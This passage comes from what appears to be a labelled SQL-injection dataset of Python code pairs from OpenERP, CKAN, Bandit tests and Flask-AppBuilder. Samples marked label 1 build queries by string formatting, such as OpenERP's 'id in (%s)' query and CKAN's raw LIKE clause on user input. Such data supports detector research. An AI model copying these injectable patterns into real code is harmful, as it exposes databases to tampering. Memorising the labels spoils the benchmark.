issues[0].lineno)\n        self.assertEqual(list(range(1, 3)), issues[0].linerange)\n        self.assertIn('subprocess', issues[0].get_code())\n        self.assertEqual(5, issues[1].lineno)\n        self.assertEqual(list(range(3, 6 + 1)), issues[1].linerange)\n        self.assertIn('shell=True', issues[1].get_code())\n\n    def test_code_line_numbers(self):\n        self.run_example('binding.py')\n        issues = self.b_mgr.get_issue_list()\n\n        code_lines = issues[0].get_code().splitlines()\n        lineno = issues[0].lineno\n        self.assertEqual(\"%i \" % (lineno - 1), code_lines[0][:2])\n        self.assertEqual(\"%i \" % (lineno), code_lines[1][:2])\n        self.assertEqual(\"%i \" % (lineno + 1), code_lines[2][:2])\n\n    def test_flask_debug_true(self):\n        expect = {\n            'SEVERITY': {'HIGH': 1},\n            'CONFIDENCE': {'MEDIUM': 1}\n        }\n        self.check_example('flask_debug.py', expect)\n\n    def test_nosec(self):\n        expect = {\n            'SEVERITY': {},\n            'CONFIDENCE': {}\n        }\n        self.check_example('nosec.py', expect)\n\n    def test_baseline_filter(self):\n        issue_text = ('A Flask app appears to be run with debug=True, which '\n                      'exposes the Werkzeug debugger and allows the execution '\n                      'of arbitrary code.')\n        json = \"\"\"{\n          \"results\": [\n            {\n              \"code\": \"...\",\n              \"filename\": \"%s/examples/flask_debug.py\",\n              \"issue_confidence\": \"MEDIUM\",\n              \"issue_severity\": \"HIGH\",\n              \"issue_text\": \"%s\",\n              \"line_number\": 10,\n              \"line_range\": [\n                10\n              ],\n              \"test_name\": \"flask_debug_true\",\n              \"test_id\": \"B201\"\n            }\n          ]\n        }\n        \"\"\" % (os.getcwd(), issue_text)\n\n        self.b_mgr.populate_baseline(json)\n        self.run_example('flask_debug.py')\n        self.assertEqual(1, len(self.b_mgr.baseline))\n        self.assertEqual({}, self.b_mgr.get_issue_list())\n\n    def test_blacklist_input(self):\n        expect = {\n            'SEVERITY': {'HIGH': 1},\n            'CONFIDENCE': {'HIGH': 1}\n        }\n        self.check_example('input.py', expect)\n/n/n/n", "label": 1, "vtype": "sql"}, {"id": "b48fb1cde6b7bbc49f502974a034ee1cf7e87e6c", "code": "addons/point_of_sale/wizard/pos_close_statement.py/n/n# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\n\nclass pos_close_statement(osv.osv_memory):\n    _name = 'pos.close.statement'\n    _description = 'Close Statements'\n\n    def close_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Close the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Dictionary\n        \"\"\"\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        statement_obj = self.pool.get('account.bank.statement')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        journal_ids = journal_obj.search(cr, uid, [('auto_cash', '=', True), ('type', '=', 'cash'), ('id', 'in', j_ids)])\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if not ids:\n                raise osv.except_osv(_('Message'), _('Journals are already closed'))\n            else:\n                list_statement.append(ids[0])\n                if not journal.check_dtls:\n                    statement_obj.button_confirm_cash(cr, uid, ids, context)\n\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n        return {\n                'domain': \"[('id','in',\" + str(list_statement) + \")]\",\n                'name': 'Close Statements',\n                'view_type': 'form',\n                'view_mode': 'tree,form',\n                'res_model': 'account.bank.statement',\n                'views': [(id2, 'tree'),(id3, 'form')],\n                'type': 'ir.actions.act_window'}\n\npos_close_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n/n/n/naddons/point_of_sale/wizard/pos_open_statement.py/n/n# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\nimport time\n\nclass pos_open_statement(osv.osv_memory):\n    _name = 'pos.open.statement'\n    _description = 'Open Statements'\n\n    def open_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Open the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Directory\n        \"\"\"\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        statement_obj = self.pool.get('account.bank.statement')\n        sequence_obj = self.pool.get('ir.sequence')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        journal_ids = journal_obj.search(cr, uid, [('auto_cash', '=', True), ('type', '=', 'cash'), ('id', 'in', j_ids)])\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if len(ids):\n                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for \"%s\". \\n Please close the cashbox related to. ' %(journal.name)))\n            \n            number = ''\n            if journal.sequence_id:\n                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)\n            else:\n                number = sequence_obj.get(cr, uid, 'account.bank.statement')\n            \n            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,\n                                                          'company_id': company_id,\n                                                          'user_id': uid,\n                                                          'state': 'open',\n                                                          'name': number,\n                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),\n                                                      })\n            statement_obj.button_open(cr, uid, [statement_id], context)\n\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n\n        return {\n            'domain': \"[('state','=','open')]\",\n            'name': 'Open Statement',\n            'view_type': 'form',\n            'view_mode': 'tree,form',\n            'res_model': 'account.bank.statement',\n            'views': [(id2, 'tree'),(id3, 'form')],\n            'type': 'ir.actions.act_window'\n}\npos_open_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n/n/n/n", "label": 0, "vtype": "sql"}, {"id": "b48fb1cde6b7bbc49f502974a034ee1cf7e87e6c", "code": "/addons/point_of_sale/wizard/pos_close_statement.py/n/n# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\n\nclass pos_close_statement(osv.osv_memory):\n    _name = 'pos.close.statement'\n    _description = 'Close Statements'\n\n    def close_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Close the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Dictionary\n        \"\"\"\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        statement_obj = self.pool.get('account.bank.statement')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        cr.execute(\"\"\" select id from account_journal\n                            where auto_cash='True' and type='cash'\n                            and id in (%s)\"\"\" %(','.join(map(lambda x: \"'\" + str(x) + \"'\", j_ids))))\n        journal_ids = map(lambda x1: x1[0], cr.fetchall())\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if not ids:\n                raise osv.except_osv(_('Message'), _('Journals are already closed'))\n            else:\n                list_statement.append(ids[0])\n                if not journal.check_dtls:\n                    statement_obj.button_confirm_cash(cr, uid, ids, context)\n    #        if not list_statement:\n    #            return {}\n    #        model_data_ids = mod_obj.search(cr, uid,[('model','=','ir.ui.view'),('name','=','view_bank_statement_tree')], context=context)\n    #        resource_id = mod_obj.read(cr, uid, model_data_ids, fields=['res_id'], context=context)[0]['res_id']\n\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n        return {\n                'domain': \"[('id','in',\" + str(list_statement) + \")]\",\n                'name': 'Close Statements',\n                'view_type': 'form',\n                'view_mode': 'tree,form',\n                'res_model': 'account.bank.statement',\n                'views': [(id2, 'tree'),(id3, 'form')],\n                'type': 'ir.actions.act_window'}\n\npos_close_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n/n/n/n/addons/point_of_sale/wizard/pos_open_statement.py/n/n# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\nimport time\n\nclass pos_open_statement(osv.osv_memory):\n    _name = 'pos.open.statement'\n    _description = 'Open Statements'\n\n    def open_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Open the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Directory\n        \"\"\"\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        statement_obj = self.pool.get('account.bank.statement')\n        sequence_obj = self.pool.get('ir.sequence')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        cr.execute(\"\"\" select id from account_journal\n                            where auto_cash='True' and type='cash'\n                            and id in (%s)\"\"\" %(','.join(map(lambda x: \"'\" + str(x) + \"'\", j_ids))))\n        journal_ids = map(lambda x1: x1[0], cr.fetchall())\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if len(ids):\n                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for \"%s\". \\n Please close the cashbox related to. ' %(journal.name)))\n            \n#            cr.execute(\"\"\" Select id from account_bank_statement\n#                                    where journal_id =%d\n#                                    and company_id =%d\n#                                    order by id desc limit 1\"\"\" %(journal.id, company_id))\n#            st_id = cr.fetchone()\n            \n            number = ''\n            if journal.sequence_id:\n                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)\n            else:\n                number = sequence_obj.get(cr, uid, 'account.bank.statement')\n            \n            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,\n                                                          'company_id': company_id,\n                                                          'user_id': uid,\n                                                          'state': 'open',\n                                                          'name': number,\n                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),\n                                                      })\n            statement_obj.button_open(cr, uid, [statement_id], context)\n\n    #            period = statement_obj._get_period(cr, uid, context) or None\n    #            cr.execute(\"INSERT INTO account_bank_statement(journal_id,company_id,user_id,state,name, period_id,date) VALUES(%d,%d,%d,'open','%s',%d,'%s')\"%(journal.id, company_id, uid, number, period, time.strftime('%Y-%m-%d %H:%M:%S')))\n    #            cr.commit()\n    #            cr.execute(\"select id from account_bank_statement where journal_id=%d and company_id=%d and user_id=%d and state='open' and name='%s'\"%(journal.id, company_id, uid, number))\n    #            statement_id = cr.fetchone()[0]\n    #            print \"statement_id\",statement_id\n    #            if st_id:\n    #                statemt_id = statement_obj.browse(cr, uid, st_id[0])\n    #                list_statement.append(statemt_id.id)\n    #                if statemt_id and statemt_id.ending_details_ids:\n    #                    statement_obj.write(cr, uid, [statement_id], {\n    #                        'balance_start': statemt_id.balance_end,\n    #                        'state': 'open',\n    #                    })\n    #                    if statemt_id.ending_details_ids:\n    #                        for i in statemt_id.ending_details_ids:\n    #                            c = statement_obj.create(cr, uid, {\n    #                                'pieces': i.pieces,\n    #                                'number': i.number,\n    #                                'starting_id': statement_id,\n    #                            })\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n\n        return {\n#           'domain': \"[('id','in', [\"+','.join(map(str,list_statement))+\"])]\",\n            'domain': \"[('state','=','open')]\",\n            'name': 'Open Statement',\n            'view_type': 'form',\n            'view_mode': 'tree,form',\n            'res_model': 'account.bank.statement',\n            'views': [(id2, 'tree'),(id3, 'form')],\n            'type': 'ir.actions.act_window'\n}\npos_open_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n/n/n/n", "label": 1, "vtype": "sql"}, {"id": "f020853c54a1851f196d7fd8897c4620bccf9f6c", "code": "ckan/models/package.py/n/nimport sqlobject\n\ntry:\n    # vdm >= 0.2\n    import vdm.sqlobject.base as vdmbase\n    from vdm.sqlobject.base import State\nexcept:\n    # vdm == 0.1\n    import vdm.base as vdmbase\n    from vdm.base import State\n\n# American spelling ...\nclass License(sqlobject.SQLObject):\n\n    class sqlmeta:\n        _defaultOrder = 'name'\n\n    name = sqlobject.UnicodeCol(alternateID=True)\n    packages = sqlobject.MultipleJoin('Package')\n\n\nclass PackageRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('Package', cascade=True)\n    title = sqlobject.UnicodeCol(default=None)\n    url = sqlobject.UnicodeCol(default=None)\n    download_url = sqlobject.UnicodeCol(default=None)\n    license = sqlobject.ForeignKey('License', default=None)\n    notes = sqlobject.UnicodeCol(default=None)\n\n\nclass TagRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('Tag', cascade=True)\n\n\nclass PackageTagRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('PackageTag', cascade=True)\n\n\nclass Package(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = PackageRevision\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n    \n    name = sqlobject.UnicodeCol(alternateID=True)\n\n    # should be attribute_name, module_name, module_object\n    m2m = [ ('tags', 'ckan.models.package', 'Tag', 'PackageTag') ]\n\n    def add_tag_by_name(self, tagname):\n        try:\n            tag = self.revision.model.tags.get(tagname)\n        except: # TODO: make this specific\n            tag = self.transaction.model.tags.create(name=tagname)\n        self.tags.create(tag=tag)\n\n\nclass Tag(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = TagRevision\n\n    name = sqlobject.UnicodeCol(alternateID=True)\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n\n    m2m = [ ('packages', 'ckan.models.package', 'Package', 'PackageTag') ]\n\n    @classmethod\n    def search_by_name(self, text_query):\n        text_query = str(text_query) # SQLObject chokes on unicode.\n        return self.select(self.q.name.contains(text_query.lower()))\n\n\nclass PackageTag(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = PackageTagRevision\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n    m2m = []\n\n    package = sqlobject.ForeignKey('Package', cascade=True)\n    tag = sqlobject.ForeignKey('Tag', cascade=True)\n\n    package_tag_index = sqlobject.DatabaseIndex('package', 'tag',\n            unique=True)\n\n/n/n/n", "label": 0, "vtype": "sql"}, {"id": "f020853c54a1851f196d7fd8897c4620bccf9f6c", "code": "/ckan/models/package.py/n/nimport sqlobject\n\ntry:\n    # vdm >= 0.2\n    import vdm.sqlobject.base as vdmbase\n    from vdm.sqlobject.base import State\nexcept:\n    # vdm == 0.1\n    import vdm.base as vdmbase\n    from vdm.base import State\n\n# American spelling ...\nclass License(sqlobject.SQLObject):\n\n    class sqlmeta:\n        _defaultOrder = 'name'\n\n    name = sqlobject.UnicodeCol(alternateID=True)\n    packages = sqlobject.MultipleJoin('Package')\n\n\nclass PackageRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('Package', cascade=True)\n    title = sqlobject.UnicodeCol(default=None)\n    url = sqlobject.UnicodeCol(default=None)\n    download_url = sqlobject.UnicodeCol(default=None)\n    license = sqlobject.ForeignKey('License', default=None)\n    notes = sqlobject.UnicodeCol(default=None)\n\n\nclass TagRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('Tag', cascade=True)\n\n\nclass PackageTagRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('PackageTag', cascade=True)\n\n\nclass Package(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = PackageRevision\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n    \n    name = sqlobject.UnicodeCol(alternateID=True)\n\n    # should be attribute_name, module_name, module_object\n    m2m = [ ('tags', 'ckan.models.package', 'Tag', 'PackageTag') ]\n\n    def add_tag_by_name(self, tagname):\n        try:\n            tag = self.revision.model.tags.get(tagname)\n        except: # TODO: make this specific\n            tag = self.transaction.model.tags.create(name=tagname)\n        self.tags.create(tag=tag)\n\n\nclass Tag(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = TagRevision\n\n    name = sqlobject.UnicodeCol(alternateID=True)\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n\n    m2m = [ ('packages', 'ckan.models.package', 'Package', 'PackageTag') ]\n\n    @classmethod\n    def search_by_name(self, text_query):\n        text_query_str = str(text_query) # SQLObject chokes on unicode.\n        # Todo: Change to use SQLObject statement objects.\n        sql_query = \"UPPER(tag.name) LIKE UPPER('%%%s%%')\" % text_query_str\n        return self.select(sql_query)\n\n\nclass PackageTag(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = PackageTagRevision\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n    m2m = []\n\n    package = sqlobject.ForeignKey('Package', cascade=True)\n    tag = sqlobject.ForeignKey('Tag', cascade=True)\n\n    package_tag_index = sqlobject.DatabaseIndex('package', 'tag',\n            unique=True)\n\n/n/n/n", "label": 1, "vtype": "sql"}, {"id": "2158db051408e0d66210a99b17c121be008e20b6", "code": "flask_appbuilder/models/sqla/interface.py/n/n# -*- coding: utf-8 -*-\nimport sys\nimport logging\nimport sqlalchemy as sa\n\nfrom . import filters\nfrom sqlalchemy.orm import joinedload\nfrom sqlalchemy.exc import IntegrityError\nfrom sqlalchemy import func\nfrom sqlalchemy.orm.properties import SynonymProperty\n\nfrom ..base import BaseInterface\nfrom ..group import GroupByDateYear, GroupByDateMonth, GroupByCol\nfrom ..mixins import FileColumn, ImageColumn\nfrom ...filemanager import FileManager, ImageManager\nfrom ..._compat import as_unicode\nfrom ...const import LOGMSG_ERR_DBI_ADD_GENERIC, LOGMSG_ERR_DBI_EDIT_GENERIC, LOGMSG_ERR_DBI_DEL_GENERIC, \\\n    LOGMSG_WAR_DBI_ADD_INTEGRITY, LOGMSG_WAR_DBI_EDIT_INTEGRITY, LOGMSG_WAR_DBI_DEL_INTEGRITY\n\nlog = logging.getLogger(__name__)\n\n\ndef _include_filters(obj):\n    for key in filters.__all__:\n        if not hasattr(obj, key):\n            setattr(obj, key, getattr(filters, key))\n\n\nclass SQLAInterface(BaseInterface):\n    \"\"\"\n    SQLAModel\n    Implements SQLA support methods for views\n    \"\"\"\n    session = None\n\n    filter_converter_class = filters.SQLAFilterConverter\n\n    def __init__(self, obj, session=None):\n        _include_filters(self)\n        self.list_columns = dict()\n        self.list_properties = dict()\n\n        self.session = session\n        # Collect all SQLA columns and properties\n        for prop in sa.orm.class_mapper(obj).iterate_properties:\n            if type(prop) != SynonymProperty:\n                self.list_properties[prop.key] = prop\n        for col_name in obj.__mapper__.columns.keys():\n            if col_name in self.list_properties:\n                self.list_columns[col_name] = obj.__mapper__.columns[col_name]\n        super(SQLAInterface, self).__init__(obj)\n\n    @property\n    def model_name(self):\n        \"\"\"\n            Returns the models class name\n            useful for auto title on views\n        \"\"\"\n        return self.obj.__name__\n\n    def _get_base_query(self, query=None, filters=None, order_column='', order_direction=''):\n        if filters:\n            query = filters.apply_all(query)\n        if order_column != '':\n            # if Model has custom decorator **renders('<COL_NAME>')**\n            # this decorator will add a property to the method named *_col_name*\n            if hasattr(self.obj, order_column):\n                if hasattr(getattr(self.obj, order_column), '_col_name'):\n                    order_column = getattr(getattr(self.obj, order_column), '_col_name')\n            query = query.order_by(\"%s %s\" % (order_column, order_direction))\n        return query\n\n    def query(self, filters=None, order_column='', order_direction='',\n              page=None, page_size=None):\n        \"\"\"\n            QUERY\n            :param filters:\n                dict with filters {<col_name>:<value,...}\n            :param order_column:\n                name of the column to order\n            :param order_direction:\n                the direction to order <'asc'|'desc'>\n            :param page:\n                the current page\n            :param page_size:\n                the current page size\n\n        \"\"\"\n        query = self.session.query(self.obj)\n        if len(order_column.split('.')) >= 2:\n            tmp_order_column = ''\n            for join_relation in order_column.split('.')[:-1]:\n                model_relation = self.get_related_model(join_relation)\n                query = query.join(model_relation)\n                # redefine order column name, because relationship can have a different name\n                # from the related table name.\n                tmp_order_column = tmp_order_column + model_relation.__tablename__ + '.'\n            order_column = tmp_order_column + order_column.split('.')[-1]\n        query_count = self.session.query(func.count('*')).select_from(self.obj)\n\n        query_count = self._get_base_query(query=query_count,\n                                           filters=filters)\n        query = self._get_base_query(query=query,\n                                     filters=filters,\n                                     order_column=order_column,\n                                     order_direction=order_direction)\n\n        count = query_count.scalar()\n\n        if page:\n            query = query.offset(page * page_size)\n        if page_size:\n            query = query.limit(page_size)\n\n        return count, query.all()\n\n    def query_simple_group(self, group_by='', aggregate_func=None, aggregate_col=None, filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group = GroupByCol(group_by, 'Group by')\n        return group.apply(query_result)\n\n    def query_month_group(self, group_by='', filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group = GroupByDateMonth(group_by, 'Group by Month')\n        return group.apply(query_result)\n\n    def query_year_group(self, group_by='', filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group_year = GroupByDateYear(group_by, 'Group by Year')\n        return group_year.apply(query_result)\n\n    \"\"\"\n    -----------------------------------------\n         FUNCTIONS for Testing TYPES\n    -----------------------------------------\n    \"\"\"\n\n    def is_image(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, ImageColumn)\n        except:\n            return False\n\n    def is_file(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, FileColumn)\n        except:\n            return False\n\n    def is_string(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.String)\n        except:\n            return False\n\n    def is_text(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Text)\n        except:\n            return False\n\n    def is_integer(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Integer)\n        except:\n            return False\n\n    def is_numeric(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Numeric)\n        except:\n            return False\n\n    def is_float(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Float)\n        except:\n            return False\n\n    def is_boolean(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Boolean)\n        except:\n            return False\n\n    def is_date(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Date)\n        except:\n            return False\n\n    def is_datetime(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.DateTime)\n        except:\n            return False\n\n    def is_relation(self, col_name):\n        try:\n            return isinstance(self.list_properties[col_name], sa.orm.properties.RelationshipProperty)\n        except:\n            return False\n\n    def is_relation_many_to_one(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'MANYTOONE'\n        except:\n            return False\n\n    def is_relation_many_to_many(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'MANYTOMANY'\n        except:\n            return False\n\n    def is_relation_one_to_one(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'ONETOONE'\n        except:\n            return False\n\n    def is_relation_one_to_many(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'ONETOMANY'\n        except:\n            return False\n\n    def is_nullable(self, col_name):\n        if self.is_relation_many_to_one(col_name):\n            col = self.get_relation_fk(col_name)\n            return col.nullable\n        try:\n            return self.list_columns[col_name].nullable\n        except:\n            return False\n\n    def is_unique(self, col_name):\n        try:\n            return self.list_columns[col_name].unique\n        except:\n            return False\n\n    def is_pk(self, col_name):\n        try:\n            return self.list_columns[col_name].primary_key\n        except:\n            return False\n\n    def is_fk(self, col_name):\n        try:\n            return self.list_columns[col_name].foreign_keys\n        except:\n            return False\n\n    def get_max_length(self, col_name):\n        try:\n            col = self.list_columns[col_name]\n            if col.type.length:\n                return col.type.length\n            else:\n                return -1\n        except:\n            return -1\n\n    \"\"\"\n    -------------------------------\n     FUNCTIONS FOR CRUD OPERATIONS\n    -------------------------------\n    \"\"\"\n\n    def add(self, item):\n        try:\n            self.session.add(item)\n            self.session.commit()\n            self.message = (as_unicode(self.add_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.add_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_ADD_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_ADD_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def edit(self, item):\n        try:\n            self.session.merge(item)\n            self.session.commit()\n            self.message = (as_unicode(self.edit_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.edit_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_EDIT_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + 